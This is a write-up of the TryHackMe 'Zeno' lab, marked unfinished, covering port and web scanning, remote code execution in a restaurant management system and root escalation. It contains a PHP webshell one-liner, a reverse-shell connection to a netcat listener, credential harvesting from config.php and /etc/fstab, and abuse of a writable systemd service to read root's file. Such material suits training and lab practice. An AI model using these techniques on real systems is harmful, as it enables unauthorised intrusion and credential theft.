# Zeno (unfinished writeup)

Writeup for [Zeno](https://tryhackme.com/room/zeno) room at [TryHackMe](https://tryhackme.com/).
URL for this room is: https://tryhackme.com/room/zeno

Table of Contents
=================
* [Port Scan](#Port-scan)
* [Enumerating the Webserver](#Enumerating-the-Webserver)
* [Remote Code Execution](#Remote-Code-Execution)
* [Gaining Access](#Gaining-Access)
* [Root Access](#Root-Access)

# Port scan
Firstly, I have set an environment variable `IP` of the target machine's IP address.
Then I have conducted ***Nmap SYN*** scan against all of the TCP ports of the target machine with the command `sudo nmap -vv -sS -p- $IP` to see which ports are open. I had saved the following output to a file with `-oN` flag:

```
# Nmap 7.60 scan initiated Sat Oct 23 10:27:21 2021 as: nmap -vv -sS -p- -oN enum.txt 10.10.154.116
Nmap scan report for ip-10-10-154-116.eu-west-1.compute.internal (10.10.154.116)
Host is up, received arp-response (0.00042s latency).
Scanned at 2021-10-23 10:27:21 BST for 155s
Not shown: 65533 filtered ports
Reason: 65372 no-responses and 161 host-prohibiteds
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
12340/tcp open  unknown syn-ack ttl 64
MAC Address: 02:F5:20:98:22:CD (Unknown)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Oct 23 10:29:57 2021 -- 1 IP address (1 host up) scanned in 155.84 seconds
```

The open ports are:
1. Port ***22*** runnign SSH service.
2. Port ***12340*** with an unknown service running.
Against those ports I have performed a more comprehensive scan with the command `nmap -vv -O -sV -sC -p 22,12340 $IP`. I was able to get the following information:

```
#Nmap 7.60 scan initiated Sat Oct 23 10:38:03 2021 as: nmap -vv -O -sV -sC -p 22,12340 -oN open_ports.txt 10.10.94.20
Nmap scan report for ip-10-10-154-116.eu-west-1.compute.internal (10.10.154.116)
Host is up, received arp-response (0.00043s latency).
Scanned at 2021-10-23 10:38:03 BST for 17s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDakZyfnq0JzwuM1SD3YZ4zyizbtc9AOvhk2qCaTwJHEKyyqIjBaElNv4LpSdtV7y/C6vwUfPS34IO/mAmNtAFquBDjIuoKdw9TjjPrVBVjzFxD/9tDSe+cu6ELPHMyWOQFAYtg1CV1TQlm3p6WIID2IfYBffpfSz54wRhkTJd/+9wgYdOwfe+VRuzV8EgKq4D2cbUTjYjl0dv2f2Th8WtiRksEeaqI1fvPvk6RwyiLdV5mSD/h8HCTZgYVvrjPShW9XPE/wws82/wmVFtOPfY7WAMhtx5kiPB11H+tZSAV/xpEjXQQ9V3Pi6o4vZdUvYSbNuiN4HI4gAWnp/uqPsoR
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEMyTtxVAKcLy5u87ws+h8WY+GHWg8IZI4c11KX7bOSt85IgCxox7YzOCZbUA56QOlryozIFyhzcwOeCKWtzEsA=
|   256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOKY0jLSRkYg0+fTDrwGOaGW442T5k1qBt7l8iAkcuCk
12340/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|   Supported Methods: OPTIONS GET HEAD POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
MAC Address: 02:F5:20:98:22:CD (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.13 (93%), Linux 3.8 (93%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.60%E=4%D=10/23%OT=22%CT=%CU=%PV=Y%DS=1%DC=D%G=N%M=02F520%TM=6173D80C%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10B%TI=Z%TS=A)
OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%TG=40%W=6903%O=M2301NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.030 days (since Sat Oct 23 09:55:45 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 23 10:38:20 2021 -- 1 IP address (1 host up) scanned in 16.85 seconds
```
On port ***22*** an `OpenSSH 7.4` ssh service is running.
On port ***12340*** an `Apache httpd 2.4.6 (CentOS)` webeserver is running. This webserver also has `PHP/5.4.16` installed.

# Enumerating the Webserver

Connecting to the webserver from within a browser gives ***Resource not found*** error shown below.

![Resource not found](/Zeno/images/Resource_not_found.png)

I have then used `nikto -h $IP -p 12340` command to enumerate the webserver's directories. The output of this command was:

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.154.16
+ Target Hostname:    ip-10-10-154-16.eu-west-1.compute.internal
+ Target Port:        12340
+ Start Time:         2021-10-23 11:05:36 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+ Server leaks inodes via ETags, header found with file /, fields: 0xf39 0x5c80c1adc76e0
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-10-23 11:05:46 (GMT1) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested``
```

For further enumeration of the webserver's directories I have used `gobuster dir -u http://$IP:12340 -w /usr/share/wordlists/dirb/big.txt` command, which resulted in the following:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.154.116:12340/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/10/23 14:20:25 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/rms (Status: 301)
===============================================================
2021/10/23 14:20:28 Finished
===============================================================
```

The scan lists three possible directories, from which only `/rms` one is accessible. Going to this webserver's directory via a browser gives a homepage of Pathfinder Hotel Restaurant Management System.

![Restaurant management system](/Zeno/images/Restaurant_management_system.png)

The Google search of `restaurant management system exploit` led to a Remote Code Execution exploit for this system, written in Python.

# Remote Code Execution

The downloaded exploit had formatting issues and a broken hardcoded proxy.
Fixing formatting and deleting code for proxy led to a successful upload of a webshell `<?php echo shell_exec($_GET["cmd"]); ?>` at http://$IP:12340/rms/images/reverse-shell.php URL, which shows blank page.

![Blank exploit page](/Zeno/images/Blank_exploit_page.png)

Although the uploaded webshell can accept commands with the syntax of http://$IP:12340/rms/images/reverse-shell.php?cmd=<argument>. For example, id argument prints this:

![System ID](/Zeno/images/System_ID.png)

At this point I am doing the following:

1. Exporting 1234 as a listening port - LPORT - and setting up a netcat listener with `nc -lnvp $LPORT`.
2. Passing a Python reverse shell found at [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) as an argument to the webshell URL.

The webpage is blank, but the listener captured a shell connection!


![Reverse shell](/Zeno/images/Reverse_shell.png)

# Gaining Access

Going to the server's home directory shows that the user `edward` is on the system.
Tried Hydra for cracking edward's SSH password but no luck there.
Getting back to /var/www/html/rms/connection folder and listing it's contets shows a config.php file. Inside this file there are credentials for the root user of a database.

![Database credentials](/Zeno/images/Database_credentials.png)

Although connecting to mysql database from the shell with these credentials resulted in an error.
***Update 10/29/2021***
I tried downloading LinPeas to the remote machine with curl, but it failed.
Then I looked up in /etc/fstab file and found credentials for user `edward` on zeno machine.
Connected to the remote machine with zeno password with user `edward` via SSH and found the user.txt file with the first flag.

# Root Access

There is a writable service file named zeno-monitoring.
Adding `ExecStart=/usr/bin/cp /root/root.txt /home/edward/rootflag.txt` to the zeno-monitoring service file and rebooting the machine leads to a readable root.txt with ***root flag*** after a reconnection to a rebooted machine.
